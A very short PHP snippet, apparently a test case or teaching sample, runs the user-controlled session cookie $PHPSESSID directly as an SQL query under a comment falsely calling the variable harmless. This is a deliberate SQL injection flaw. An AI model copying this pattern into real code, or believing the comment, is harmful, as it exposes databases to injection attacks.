<? //

// this variable is harmless

mysql_query($PHPSESSID);






?>
